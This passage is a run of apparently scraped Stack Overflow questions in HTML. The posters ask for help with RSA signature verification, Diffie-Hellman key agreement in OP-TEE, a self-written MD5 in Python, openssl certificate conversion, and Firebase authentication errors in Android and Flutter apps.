        String strbyte;
        for (int x = 0; x &lt; bytKey.length; x++) {
            strbyte = strHex.substring(y, (y + 2));
            if (strbyte.equals(&quot;FF&quot;)) {
                bytKey[x] = (byte) 0xFF;
            } else {
                bytKey[x] = (byte) Integer.parseInt(strbyte, 16);
            }
            y = y + 2;
        }
        return bytKey;
    }
    
    private static X509Certificate getX509Certificate(String pubKeyFileName)
            throws CertificateException, IOException {
        InputStream inStream = new FileInputStream(pubKeyFileName);
        CertificateFactory certFactory = CertificateFactory
                .getInstance(&quot;X.509&quot;);
        X509Certificate cert = (X509Certificate) certFactory
                .generateCertificate(inStream);
        inStream.close();
        return cert;
    }
    
    private static PublicKey getBFSPublicKey(String file) throws CertificateException, IOException, NumberFormatException, ParseException
    {   
        return getPublicKey(getX509Certificate(file));
    }
        

}
</code></pre>
<p>php openssl_verify() returns 0.
And the error message is
error:0407008A:rsa routines:RSA_padding_check_PKCS1_type_1:invalid padding</p>
<p>Can anyone tell me why this error occurs</p>
"
"<p>I'm quite new to cypto and I'm trying to derive DH shared secret between two parties. One part is in OP-TEE (a TA) and other part is a remote server. This is my public and private key values in the TA.</p>
<pre class=""lang-c prettyprint-override""><code>static const uint8_t derive_key_dh_public_value[] = {
    0x46, 0x3b, 0x61, 0x4, 0x74, 0x26, 0x81, 0x71, 0xee, 0xba, 0x8b, 0xe, 0xe, 0x34, 0xd, 0x39,
    0x8f, 0xb3, 0xa1, 0x44, 0x63, 0x19, 0x8f, 0x66, 0x6b, 0x80, 0x48, 0x55, 0x8b, 0x96, 0x65, 0x3c,
    0x4a, 0x69, 0x48, 0xbd, 0x65, 0xa5, 0xa5, 0x5c, 0x9, 0x12, 0x30, 0x86, 0xcd, 0x68, 0x11, 0x24,
    0x6, 0x68, 0xb1, 0x36, 0x47, 0x1a, 0x19, 0xb2, 0x5c, 0xb, 0x92, 0x29, 0x2d, 0xa6, 0x1f, 0x22,
    0xc0, 0x36, 0x4e, 0xcd, 0x1, 0x68, 0xcb, 0xd9, 0xd4, 0x1b, 0xae, 0xf9, 0x4b, 0x70, 0x61, 0x7c,
    0x7c, 0xb8, 0x42, 0xf0, 0xaa, 0xd9, 0x5b, 0xd2, 0x37, 0x84, 0x70, 0x1d, 0x18, 0x4a, 0xd4, 0xf3,
    0xac, 0x95, 0x6e, 0xd7, 0xea, 0x70, 0x66, 0xd6, 0x20, 0x27, 0x27, 0xbe, 0x40, 0x62, 0x96, 0xdb,
    0x6e, 0xa7, 0xc4, 0x7, 0xaa, 0x75, 0x86, 0xb5, 0xc9, 0x44, 0xa1, 0xa8, 0x9f, 0xe0, 0xc6, 0x4d,
    0x71, 0x15, 0x80, 0x83, 0x5, 0x5, 0x15, 0xfc, 0xba, 0x56, 0x52, 0xd4, 0x25, 0xcd, 0x75, 0x88,
    0xcc, 0xce, 0x9d, 0x5e, 0xdf, 0xef, 0xc1, 0x58, 0xfc, 0xc6, 0x91, 0xc3, 0xcd, 0x72, 0xfe, 0xa5,
    0x36, 0xdd, 0x68, 0x90, 0x66, 0xea, 0x38, 0x2a, 0x1a, 0x6, 0xb, 0x38, 0xb5, 0xaf, 0x58, 0x7e,
    0x39, 0x9c, 0x6c, 0xab, 0x1f, 0xd5, 0x0, 0xb4, 0x69, 0x63, 0xa4, 0x8b, 0xa3, 0xf1, 0x1e, 0xef,
    0x97, 0x28, 0x32, 0x7a, 0xd0, 0x1c, 0xa3, 0x5d, 0xf, 0x93, 0xa, 0x6b, 0x90, 0x78, 0x6b, 0xf0,
    0x1d, 0xed, 0xeb, 0x85, 0x46, 0x54, 0x76, 0x32, 0x15, 0xbe, 0x96, 0x8e, 0xe2, 0x70, 0x60, 0x16,
    0xae, 0xf7, 0xe5, 0x29, 0xc3, 0x70, 0xf0, 0x6b, 0x4c, 0xb7, 0xf0, 0x7c, 0x7a, 0xc8, 0xee, 0x38,
    0x7f, 0x5d, 0xf4, 0x28, 0x64, 0x94, 0x59, 0x43, 0xcd, 0x57, 0x87, 0x33, 0x7b, 0xae, 0xee, 0xfe
};


static const uint8_t derive_key_dh_private_value[] = {
    0x14, 0x4d, 0x4a, 0x39, 0xbc, 0xa5, 0x3, 0xcf, 0x50, 0xd0, 0x6e, 0x37, 0xf7, 0xc8, 0x40, 0x63,
    0x56, 0x5b, 0xb2, 0xe3, 0xb3, 0x81, 0x1e, 0x39, 0xb1, 0x9b, 0xaf, 0x19, 0xee, 0xd3, 0x84, 0xbf,
    0x2, 0xa9, 0xd3, 0x24, 0xb8, 0x5f, 0xfa, 0xe1, 0x26, 0xe5, 0x8e, 0x37, 0xb9, 0x11, 0xa9, 0x79,
    0xbb, 0xd5, 0x91, 0x12, 0x71, 0xd8, 0xe6, 0x9d, 0x76, 0x7, 0x21, 0x15, 0x7b, 0xfd, 0xe5, 0x7a,
    0x52, 0xee, 0x3c, 0x86, 0x31, 0x47, 0x6b, 0x96, 0x10, 0xea, 0x22, 0xbc, 0x7c, 0xa4, 0x79, 0xb2,
    0x1d, 0x8e, 0x55, 0xc1, 0xdc, 0x18, 0x5d, 0x35, 0x68, 0x46, 0x9d, 0x69, 0x63, 0x68, 0xfa, 0x67,
    0xf6, 0x64, 0x70, 0x4a, 0x62, 0xbf, 0xb2, 0x2d, 0xd5, 0x44, 0x31, 0x28, 0x54, 0x86, 0xf6, 0x30,
    0x52, 0x5c, 0x6e, 0x9b, 0x4b, 0x39, 0x15, 0xe7, 0x5, 0x5a, 0x7f, 0x64, 0x9, 0x24, 0x27, 0xc1
};
</code></pre>
<p>In the remote server side I'm using this peer public key like this:</p>
<pre class=""lang-py prettyprint-override""><code>from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import dh

derive_key_dh_public_value = '463b614074268171eeba8b0e0e340d398fb3a14463198f666b8048558b96653c4a6948bd65a5a55c909123086cd681124668b136471a19b25cb9292da61f22c0364ecd0168cbd9d41baef94b70617c7cb842f0aad95bd23784701d184ad4f3ac956ed7ea7066d6202727be406296db6ea7c407aa7586b5c944a1a89fe0c64d711580835055fcba5652d425cd7588ccce9d5edfefc158fcc691c3cd72fea536dd689066ea382a1a60b38b5af587e399c6cab1fd500b46963a48ba3f11eef9728327ad01ca35d0f93a6b90786bf01dedeb854654763215be968ee2706016aef7e529c370f06b4cb7f07c7ac8ee387f5df42864945943cd5787337baeee'

public_key_int = int.from_bytes(bytes.fromhex(derive_key_dh_public_value), byteorder='big')

# Standard DH parameters for 2048-bit MODP Group from RFC 3526 (Group 14)
parameters = parameters_numbers.parameters(default_backend())

public_numbers = dh.DHPublicNumbers(public_key_int, parameters.parameter_numbers())
public_key = public_numbers.public_key(backend=default_backend())
</code></pre>
<p>I'm using the correct base = 5!</p>
<p>An I'm using hazmat library in Python to generate and derive the shared secret. I'm using the same p and g used in my OP-TEE TA. The generated public key in the server is:</p>
<pre class=""lang-py prettyprint-override""><code>from cryptography.hazmat.primitives import serialization

keygen_dh2048_p_bytes = bytes.fromhex(&quot;8F3EC136CA60CED1C5FD2205D69438204FE1AFBCA682BD71FDD6C261E8C1BDA95EFD0251B61F3830447694B3267935C4DF5180AF0D81CCA233D11E77B806D7E5833404F2962437FEBC209C664CEB4FFD1F995640D9E86B2A8D6B56B2B46D83474C18538BB1A351C207A336434B9410FD24A3777477FA984B430BB6EC7F5C7EBAB7C7AA72119F731445037A4EE5E75C64B86666CEEEF8FF610F5D4EF6EDB1E52F52AC2B8F340D13F64A3A6C56B33C52A8B9BC27CA3BFB6EE752FBB02B4FC4BD2436E4710774695FE0B8595F742FCC03B06D90D8D37C5A31465C7D1CC80D18808E5AA85E4D112B76AC1E005180E3ED7AC04F80FA5FD5D74FA714E1603C9577CA3B&quot;)
keygen_dh2048_g_bytes = bytes.fromhex(&quot;05&quot;)

# Load the parameters
parameters_numbers = dh.DHParameterNumbers(
    p=int.from_bytes(keygen_dh2048_p_bytes, &quot;big&quot;),
    g=int.from_bytes(keygen_dh2048_g_bytes, &quot;big&quot;)
)


def generate_dh_key_pair():
    parameters = parameters = parameters_numbers.parameters(default_backend())
    private_key = parameters.generate_private_key()
    public_key = private_key.public_key()
    return private_key, public_key

def serialize_public_key(public_key):
    return public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
def format_bytes_as_c_array(byte_array):
    return ', '.join(['0x{:02x}'.format(b) for b in byte_array])

private_key, public_key = generate_dh_key_pair()
    alice_public_key_bytes = serialize_public_key(public_key)
    formatted_public_key = format_bytes_as_c_array(alice_public_key_bytes)
</code></pre>
<p>And I'm using this peer public key in TA in the following format:</p>
<pre class=""lang-c prettyprint-override""><code>static const uint8_t dh_key[] = {
0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e, 
0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 
0x59, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a, 0x4d, 0x49, 0x49, 
0x43, 0x4a, 0x44, 0x43, 0x43, 0x41, 0x52, 0x63, 0x47, 0x43, 
0x53, 0x71, 0x47, 0x53, 0x49, 0x62, 0x33, 0x44, 0x51, 0x45, 
0x44, 0x41, 0x54, 0x43, 0x43, 0x41, 0x51, 0x67, 0x43, 0x67, 
0x67, 0x45, 0x42, 0x41, 0x4b, 0x58, 0x39, 0x66, 0x62, 0x50, 
0x52, 0x6b, 0x4a, 0x75, 0x4e, 0x44, 0x34, 0x72, 0x70, 0x7a, 
0x78, 0x30, 0x70, 0x59, 0x46, 0x38, 0x36, 0x51, 0x46, 0x64, 
0x38, 0x0a, 0x54, 0x61, 0x76, 0x42, 0x65, 0x35, 0x5a, 0x69, 
0x65, 0x67, 0x35, 0x36, 0x33, 0x58, 0x76, 0x64, 0x67, 0x76, 
0x50, 0x67, 0x54, 0x62, 0x54, 0x71, 0x49, 0x74, 0x56, 0x76, 
0x30, 0x46, 0x43, 0x4b, 0x50, 0x49, 0x4a, 0x4e, 0x69, 0x68, 
0x39, 0x7a, 0x6b, 0x36, 0x76, 0x67, 0x39, 0x48, 0x48, 0x75, 
0x48, 0x6c, 0x48, 0x53, 0x72, 0x44, 0x59, 0x63, 0x4a, 0x47, 
0x73, 0x67, 0x32, 0x66, 0x49, 0x73, 0x0a, 0x39, 0x70, 0x65, 
0x6d, 0x56, 0x6c, 0x75, 0x6c, 0x68, 0x6d, 0x33, 0x47, 0x57, 
0x77, 0x37, 0x50, 0x41, 0x54, 0x36, 0x75, 0x6d, 0x61, 0x4d, 
0x59, 0x55, 0x4c, 0x55, 0x35, 0x77, 0x35, 0x79, 0x30, 0x63, 
0x32, 0x56, 0x4e, 0x70, 0x5a, 0x52, 0x34, 0x6a, 0x56, 0x5a, 
0x68, 0x45, 0x6d, 0x4a, 0x71, 0x73, 0x4a, 0x66, 0x4e, 0x47, 
0x48, 0x53, 0x49, 0x77, 0x65, 0x70, 0x31, 0x73, 0x54, 0x7a, 
0x52, 0x0a, 0x6e, 0x37, 0x31, 0x43, 0x39, 0x54, 0x39, 0x73, 
0x68, 0x4f, 0x75, 0x66, 0x36, 0x64, 0x76, 0x6d, 0x53, 0x6e, 
0x46, 0x65, 0x61, 0x51, 0x42, 0x54, 0x56, 0x31, 0x6e, 0x70, 
0x6e, 0x68, 0x50, 0x45, 0x65, 0x51, 0x41, 0x6f, 0x31, 0x2f, 
0x38, 0x53, 0x6d, 0x61, 0x4a, 0x4d, 0x43, 0x49, 0x36, 0x5a, 
0x54, 0x4f, 0x77, 0x4b, 0x69, 0x36, 0x34, 0x53, 0x4e, 0x72, 
0x38, 0x41, 0x71, 0x7a, 0x45, 0x72, 0x0a, 0x38, 0x50, 0x6c, 
0x70, 0x75, 0x57, 0x50, 0x6b, 0x36, 0x49, 0x49, 0x66, 0x66, 
0x77, 0x6d, 0x53, 0x46, 0x55, 0x2b, 0x53, 0x50, 0x4b, 0x54, 
0x7a, 0x68, 0x34, 0x52, 0x31, 0x38, 0x78, 0x4b, 0x55, 0x35, 
0x68, 0x67, 0x4d, 0x44, 0x7a, 0x76, 0x53, 0x71, 0x30, 0x41, 
0x72, 0x39, 0x47, 0x4b, 0x4c, 0x61, 0x48, 0x6b, 0x63, 0x77, 
0x6b, 0x43, 0x48, 0x73, 0x67, 0x77, 0x34, 0x63, 0x6f, 0x58, 
0x74, 0x0a, 0x30, 0x41, 0x33, 0x5a, 0x73, 0x36, 0x55, 0x56, 
0x6c, 0x51, 0x67, 0x6e, 0x43, 0x64, 0x79, 0x2f, 0x64, 0x50, 
0x5a, 0x75, 0x74, 0x71, 0x4a, 0x5a, 0x4b, 0x7a, 0x69, 0x70, 
0x37, 0x55, 0x6b, 0x4c, 0x41, 0x4a, 0x65, 0x73, 0x71, 0x53, 
0x30, 0x34, 0x4c, 0x75, 0x34, 0x72, 0x38, 0x2b, 0x4b, 0x41, 
0x56, 0x54, 0x67, 0x52, 0x34, 0x65, 0x64, 0x32, 0x36, 0x4c, 
0x4d, 0x43, 0x41, 0x51, 0x49, 0x44, 0x0a, 0x67, 0x67, 0x45, 
0x46, 0x41, 0x41, 0x4b, 0x43, 0x41, 0x51, 0x42, 0x4b, 0x6b, 
0x42, 0x31, 0x4c, 0x43, 0x35, 0x36, 0x30, 0x4a, 0x68, 0x77, 
0x71, 0x6a, 0x61, 0x38, 0x51, 0x4d, 0x70, 0x6a, 0x73, 0x36, 
0x6d, 0x6a, 0x6c, 0x4b, 0x37, 0x79, 0x79, 0x4b, 0x66, 0x72, 
0x4a, 0x42, 0x58, 0x4b, 0x67, 0x34, 0x47, 0x38, 0x6b, 0x67, 
0x78, 0x76, 0x56, 0x79, 0x59, 0x69, 0x48, 0x79, 0x44, 0x45, 
0x33, 0x0a, 0x36, 0x43, 0x57, 0x62, 0x50, 0x33, 0x62, 0x4e, 
0x71, 0x49, 0x4f, 0x72, 0x71, 0x36, 0x6c, 0x30, 0x77, 0x56, 
0x70, 0x6c, 0x58, 0x38, 0x4c, 0x42, 0x55, 0x33, 0x72, 0x70, 
0x2f, 0x57, 0x6b, 0x74, 0x70, 0x79, 0x4b, 0x75, 0x6a, 0x41, 
0x70, 0x52, 0x6b, 0x64, 0x47, 0x75, 0x41, 0x64, 0x38, 0x72, 
0x70, 0x37, 0x41, 0x5a, 0x52, 0x58, 0x4d, 0x50, 0x65, 0x6a, 
0x51, 0x6a, 0x39, 0x34, 0x6a, 0x69, 0x0a, 0x52, 0x52, 0x4e, 
0x4e, 0x74, 0x32, 0x4b, 0x42, 0x71, 0x37, 0x73, 0x4b, 0x41, 
0x71, 0x45, 0x6e, 0x68, 0x65, 0x47, 0x45, 0x46, 0x7a, 0x36, 
0x62, 0x56, 0x79, 0x32, 0x6e, 0x78, 0x42, 0x6e, 0x30, 0x39, 
0x41, 0x35, 0x33, 0x58, 0x75, 0x75, 0x64, 0x4b, 0x7a, 0x49, 
0x6b, 0x61, 0x4b, 0x71, 0x4d, 0x34, 0x34, 0x50, 0x69, 0x41, 
0x48, 0x62, 0x46, 0x61, 0x57, 0x42, 0x6e, 0x68, 0x42, 0x67, 
0x6e, 0x0a, 0x35, 0x77, 0x53, 0x64, 0x76, 0x4b, 0x2f, 0x70, 
0x36, 0x77, 0x30, 0x4d, 0x4f, 0x55, 0x6d, 0x54, 0x6d, 0x35, 
0x6d, 0x56, 0x2b, 0x4d, 0x43, 0x71, 0x65, 0x44, 0x73, 0x6b, 
0x49, 0x33, 0x39, 0x63, 0x66, 0x51, 0x4e, 0x57, 0x59, 0x70, 
0x72, 0x44, 0x72, 0x45, 0x74, 0x44, 0x4b, 0x5a, 0x33, 0x72, 
0x6e, 0x56, 0x36, 0x37, 0x33, 0x4b, 0x4d, 0x55, 0x67, 0x64, 
0x54, 0x4e, 0x69, 0x4d, 0x61, 0x6d, 0x0a, 0x49, 0x31, 0x7a, 
0x75, 0x72, 0x2f, 0x6c, 0x6e, 0x73, 0x63, 0x2f, 0x56, 0x61, 
0x66, 0x30, 0x4e, 0x38, 0x41, 0x4a, 0x6c, 0x52, 0x43, 0x71, 
0x30, 0x6a, 0x4a, 0x39, 0x55, 0x4a, 0x49, 0x51, 0x6d, 0x43, 
0x42, 0x6e, 0x43, 0x70, 0x63, 0x61, 0x54, 0x6b, 0x64, 0x56, 
0x41, 0x75, 0x5a, 0x47, 0x34, 0x47, 0x61, 0x58, 0x38, 0x72, 
0x73, 0x75, 0x62, 0x56, 0x35, 0x44, 0x6a, 0x32, 0x72, 0x30, 
0x38, 0x0a, 0x70, 0x7a, 0x2f, 0x56, 0x38, 0x61, 0x7a, 0x71, 
0x36, 0x59, 0x4a, 0x6f, 0x58, 0x38, 0x31, 0x45, 0x5a, 0x76, 
0x52, 0x4a, 0x42, 0x4f, 0x43, 0x4a, 0x66, 0x63, 0x38, 0x61, 
0x6d, 0x6c, 0x36, 0x78, 0x0a, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 
0x45, 0x4e, 0x44, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43, 
0x20, 0x4b, 0x45, 0x59, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a
};
</code></pre>
<p>In remote python server:</p>
<pre class=""lang-py prettyprint-override""><code>shared_secret = derive_shared_secret(private_key, public_key)
</code></pre>
<p>The derived shared secret is not the same. I'm not sure where I'm doing wrong. Thanks for your help.</p>
"
"<p>I am trying to rewrite MD5 hashing algorithm from scratch, the program can give me the output, but it isn't correct if I double check with other program and the hashlib library. I would love if some expert can have a look and tell me where I got it wrong</p>
<pre><code>import struct
from enum import Enum
from bitarray import bitarray


from math import (
    floor,
    sin,
)

class MD5Buffer(Enum):
    A = 0x67452301
    B = 0xEFCDAB89
    C = 0x98BADCFE
    D = 0x10325476


class MD5(object):
    _string = None
    _buffers = {
        MD5Buffer.A: None,
        MD5Buffer.B: None,
        MD5Buffer.C: None,
        MD5Buffer.D: None,
    }

    @classmethod
    def hash(cls, string):
        cls._string = string

        preprocessed_bit_array = cls._step_2(cls._step_1())
        cls._step_3()
        cls._step_4(preprocessed_bit_array)
        return cls._step_5()

    @classmethod
    def _step_1(cls):
        bit_array = bitarray(endian=&quot;big&quot;)
        bit_array.frombytes(cls._string.encode(&quot;utf-8&quot;))
        bit_array.append(1)
        while len(bit_array) % 512 != 448:
            bit_array.append(0)

        return bitarray(bit_array, endian=&quot;little&quot;)

    @classmethod
    def _step_2(cls, step_1_result):
        length = (len(cls._string) * 8) % pow(2, 64)
        length_bit_array = bitarray(endian=&quot;little&quot;)
        length_bit_array.frombytes(struct.pack(&quot;&lt;Q&quot;, length))

        result = step_1_result.copy()
        result.extend(length_bit_array)
        return result

    @classmethod
    def _step_3(cls):
        for buffer_type in cls._buffers.keys():
            cls._buffers[buffer_type] = buffer_type.value

    @classmethod
    def _step_4(cls, step_2_result):
        F = lambda x, y, z: (x &amp; y) | (~x &amp; z)
        G = lambda x, y, z: (x &amp; z) | (y &amp; ~z)
        H = lambda x, y, z: x ^ y ^ z
        I = lambda x, y, z: y ^ (x | ~z)

        rotate_left = lambda x, n: (x &lt;&lt; n) | (x &gt;&gt; (32 - n))

        modular_add = lambda a, b: (a + b) % pow(2, 32)

        T = [floor(pow(2, 32) * abs(sin(i + 1))) for i in range(64)]

        N = len(step_2_result) // 32

        for chunk_index in range(N // 16):
            start = chunk_index * 512
            X = [step_2_result[start + (x * 32) : start + (x * 32) + 32] for x in range(16)]

            X = [int.from_bytes(word.tobytes(), byteorder=&quot;little&quot;) for word in X]

            A = cls._buffers[MD5Buffer.A]
            B = cls._buffers[MD5Buffer.B]
            C = cls._buffers[MD5Buffer.C]
            D = cls._buffers[MD5Buffer.D]

            for i in range(4 * 16):
                if 0 &lt;= i &lt;= 15:
                    s = [7, 12, 17, 22]
                    f = F(B, C, D)
                    k = i
                elif 16 &lt;= i &lt;= 31:
                    s = [5, 9, 14, 20]
                    f = G(B, C, D)
                    k = (5 * i + 1) % 16
                elif 32 &lt;= i &lt;= 47:
                    s = [4, 11, 16, 23]
                    f = H(B, C, D)
                    k = (3 * i + 5) % 16
                elif 48 &lt;= i &lt;= 63:
                    s = [6, 10, 15, 21]
                    f = I(B, C, D)
                    k = (7 * i) % 16

                temp = B + rotate_left((A + f + T[i] + X[k]) % 2**32, s[i%4])
                A, B, C, D = D, temp % 2**32, B, C

            cls._buffers[MD5Buffer.A] = (cls._buffers[MD5Buffer.A] + A) % 2**32
            cls._buffers[MD5Buffer.B] = (cls._buffers[MD5Buffer.B] + B) % 2**32
            cls._buffers[MD5Buffer.C] = (cls._buffers[MD5Buffer.C] + C) % 2**32
            cls._buffers[MD5Buffer.D] = (cls._buffers[MD5Buffer.D] + D) % 2**32

    @classmethod
    def _step_5(cls):
        A = struct.unpack(&quot;&lt;I&quot;, struct.pack(&quot;&gt;I&quot;, cls._buffers[MD5Buffer.A]))[0]
        B = struct.unpack(&quot;&lt;I&quot;, struct.pack(&quot;&gt;I&quot;, cls._buffers[MD5Buffer.B]))[0]
        C = struct.unpack(&quot;&lt;I&quot;, struct.pack(&quot;&gt;I&quot;, cls._buffers[MD5Buffer.C]))[0]
        D = struct.unpack(&quot;&lt;I&quot;, struct.pack(&quot;&gt;I&quot;, cls._buffers[MD5Buffer.D]))[0]

        return f&quot;{format(A, '08x')}{format(B, '08x')}{format(C, '08x')}{format(D, '08x')}&quot;

print(MD5.hash(&quot;Hello, world!&quot;))
</code></pre>
<p>I have tried rewriting the function many times, following other examples on Github but still to no result.</p>
"
"<p>I have a 16 bit key (e.g., abcd) that represents hex values, and a 16 bit input (e.g., 0123) that I read in and stored in a character array. How would I XOR these together in C? I'm pretty stuck on this and don't really know where to start. I have to use C, and the key and input are read in from text files.</p>
"
"<p>I have downloaded different type of JSON file from <a href=""https://www.blockchain.com/explorer/charts"" rel=""nofollow noreferrer"">blokchain.com</a>. I want to show them in one table how can I do that?</p>
<pre><code>import pandas as pd
import matplotlib.pyplot as plt
</code></pre>
<pre><code>try:
    df_sample = pd.read_json('/content/drive/MyDrive/bitcoin price prediction/json file from blokchain.com charts/avg-block-size.json', lines=True, nrows=100)  # Read only first 10 rows for example
    print(df_sample.head())  # Print first few rows to verify if data is read successfully
    for index, row in df_sample.iterrows():
      print(row);
except Exception as e:
    print(&quot;Error:&quot;, e)
</code></pre>
<p>what should I do for make it a graph or show in the table?</p>
"
"<p>I am trying to convert p7s file to p12 to sign documents in acrobat reader, I am using openssl to convert p7s to pem before convert pem to p12, when I have to convert pem to p12 commonly require a private key, but you can omit it by using the flag  -nokeys, but when I installed certificate in Windows I have the following error: &quot;A system-level error ocurred while verifiyingtrust&quot; and can not use in acrobat. The commands that I use are these:</p>
<p>This is the command to convert p7s to pem:</p>
<pre><code>openssl pkcs7 -inform pem -print_certs -in test.p7s -out certificate_test1.pem
</code></pre>
<p>THis is the command to convert pem to p12 (after put that I have to set a password):</p>
<pre><code>openssl pkcs12 -export -nokeys -in certificate_test1.pem -out pkcs12.p12
</code></pre>
<p>I am doning something wrong or is possible to generate the private keys for the p12 and that must to be valid for windows?</p>
<p>Thanks!!!</p>
"
"<p>I am facing an issue in my Flutter app using Firebase auth for Phone authentication, whenever i request OTP it provides me the following error:</p>
<p><a href=""https://i.stack.imgur.com/4WAzK.png"" rel=""nofollow noreferrer"">ERROR SCREENSHOT</a></p>
<blockquote>
<p>W/LocalRequestInterceptor( 4834): Error getting App Check token; using placeholder token instead. Error: com.google.firebase.FirebaseException: No AppCheckProvider installed.</p>
<p>E/FirebaseAuth( 4834): [SmsRetrieverHelper] SMS verification code request failed: unknown status code: 17028 Invalid app info in play_integrity_token</p>
<p>D/FirebaseAuth( 4834): Invoking original failure callbacks after phone verification failure for +91**********, error - This app is not authorized to use Firebase Authentication. Please verify that the correct package name, SHA-1, and SHA-256 are configured in the Firebase Console. [ Invalid app info in play_integrity_token ]</p>
</blockquote>
<p><a href=""https://i.stack.imgur.com/IJ0Pa.png"" rel=""nofollow noreferrer"">FLUTTER DOCTOR SUMMERY</a></p>
<p>Also, I have updated the proper SH1 &amp; SH256 Key and package name in Firebase</p>
"
"<p>I am writing an android app with kotlin and I am trying to implement Firebase authentication. I am using Hilt for it, however I keep getting errors that I do not know how to fix. The app keeps crashing and from the logcat I know that the error is related to the ViewModel.</p>
<pre><code>FATAL EXCEPTION: main
Process: com.example.mp_draft10, PID: 3832
java.lang.RuntimeException: Cannot create an instance of class com.example.mp_draft10.auth.SignUpViewModel
    at androidx.lifecycle.ViewModelProvider$NewInstanceFactory.create(ViewModelProvider.kt:201)
    at androidx.lifecycle.ViewModelProvider$AndroidViewModelFactory.create(ViewModelProvider.kt:320)
    at androidx.lifecycle.ViewModelProvider$AndroidViewModelFactory.create(ViewModelProvider.kt:302)
    at androidx.lifecycle.ViewModelProvider$AndroidViewModelFactory.create(ViewModelProvider.kt:276)
    at androidx.lifecycle.SavedStateViewModelFactory.create(SavedStateViewModelFactory.kt:128)
    at dagger.hilt.android.internal.lifecycle.HiltViewModelFactory.create(HiltViewModelFactory.java:173)
    at androidx.lifecycle.ViewModelProvider.get(ViewModelProvider.kt:184)
    at androidx.lifecycle.ViewModelProvider.get(ViewModelProvider.kt:150)
    at androidx.lifecycle.viewmodel.compose.ViewModelKt.get(ViewModel.kt:215)
    at androidx.lifecycle.viewmodel.compose.ViewModelKt.viewModel(ViewModel.kt:156)
    at com.example.mp_draft10.auth.SignUpScreenKt.SignUpScreen(SignUpScreen.kt:103)
    at com.example.mp_draft10.ComposableSingletons$MainActivityKt$lambda-5$1.invoke(MainActivity.kt:94)
    at com.example.mp_draft10.ComposableSingletons$MainActivityKt$lambda-5$1.invoke(MainActivity.kt:93)
    at androidx.compose.runtime.internal.ComposableLambdaImpl.invoke(ComposableLambda.jvm.kt:139)
    at androidx.compose.runtime.internal.ComposableLambdaImpl.invoke(ComposableLambda.jvm.kt:35)
    at androidx.navigation.compose.NavHostKt$NavHost$14$1.invoke(NavHost.kt:308)
    at androidx.navigation.compose.NavHostKt$NavHost$14$1.invoke(NavHost.kt:306)
    at androidx.compose.runtime.internal.ComposableLambdaImpl.invoke(ComposableLambda.jvm.kt:109)
    at androidx.compose.runtime.internal.ComposableLambdaImpl.invoke(ComposableLambda.jvm.kt:35)
    at androidx.compose.runtime.CompositionLocalKt.CompositionLocalProvider(CompositionLocal.kt:248)
    at androidx.compose.runtime.saveable.SaveableStateHolderImpl.SaveableStateProvider(SaveableStateHolder.kt:84)
    at androidx.navigation.compose.NavBackStackEntryProviderKt.SaveableStateProvider(NavBackStackEntryProvider.kt:65)
    at androidx.navigation.compose.NavBackStackEntryProviderKt.access$SaveableStateProvider(NavBackStackEntryProvider.kt:1)
    at androidx.navigation.compose.NavBackStackEntryProviderKt$LocalOwnersProvider$1.invoke(NavBackStackEntryProvider.kt:52)
    at androidx.navigation.compose.NavBackStackEntryProviderKt$LocalOwnersProvider$1.invoke(NavBackStackEntryProvider.kt:51)
    at androidx.compose.runtime.internal.ComposableLambdaImpl.invoke(ComposableLambda.jvm.kt:109)
    at androidx.compose.runtime.internal.ComposableLambdaImpl.invoke(ComposableLambda.jvm.kt:35)
    at androidx.compose.runtime.CompositionLocalKt.CompositionLocalProvider(CompositionLocal.kt:228)
    at androidx.navigation.compose.NavBackStackEntryProviderKt.LocalOwnersProvider(NavBackStackEntryProvider.kt:47)
    at androidx.navigation.compose.NavHostKt$NavHost$14.invoke(NavHost.kt:306)
    at androidx.navigation.compose.NavHostKt$NavHost$14.invoke(NavHost.kt:295)
    at androidx.compose.runtime.internal.ComposableLambdaImpl.invoke(ComposableLambda.jvm.kt:139)
    at androidx.compose.runtime.internal.ComposableLambdaImpl.invoke(ComposableLambda.jvm.kt:35)
    at androidx.compose.animation.AnimatedContentKt$AnimatedContent$6$1$5.invoke(AnimatedContent.kt:755)
    at androidx.compose.animation.AnimatedContentKt$AnimatedContent$6$1$5.invoke(AnimatedContent.kt:744)
    at androidx.compose.runtime.internal.ComposableLambdaImpl.invoke(ComposableLambda.jvm.kt:118)
    at androidx.compose.runtime.internal.ComposableLambdaImpl.invoke(ComposableLambda.jvm.kt:35)
    at androidx.compose.animation.AnimatedVisibilityKt.AnimatedEnterExitImpl(AnimatedVisibility.kt:818)
    at androidx.compose.animation.AnimatedContentKt$AnimatedContent$6$1.invoke(AnimatedContent.kt:726)
    at androidx.compose.animation.AnimatedContentKt$AnimatedContent$6$1.invoke(AnimatedContent.kt:709)
</code></pre>
<p>here is the class that the error appears to be related to</p>
<pre><code>import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.example.mp_draft10.auth.util.Resource
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.flow.receiveAsFlow
import kotlinx.coroutines.launch
import javax.inject.Inject
class SignUpViewModel @Inject constructor(
    private val repository: AuthRepository
): ViewModel() {

    val _signUpState = Channel&lt;SignInState&gt;()
    val signUpState = _signUpState.receiveAsFlow()

    fun registerUser(email: String, password: String) = viewModelScope.launch {
        repository.loginUser(email,password).collect{result -&gt;
            when(result){
                is Resource.Success -&gt;{
                    _signUpState.send(SignInState(isSuccess = &quot;Sign in success&quot;))
                }
                is Resource.Loading -&gt;{
                    _signUpState.send(SignInState(isLoading = true))
                }
                is Resource.Error -&gt;{
                    _signUpState.send(SignInState(isError = result.message))
                }
            }
        }
    }
}
</code></pre>
"
"<p>i am trying to add authentication using firebase google provider, but after authentication iam getting the firebase token in which the email is null, other things such as name, photourl is present.</p>
<p>i tried to add the scopes to the provider function but its not working</p>
<pre><code>  const handleGoogleLogin = async () =&gt; {
    const googleProvider = new GoogleAuthProvider();
    googleProvider.setCustomParameters({
      prompt: &quot;select_account&quot;,
    });
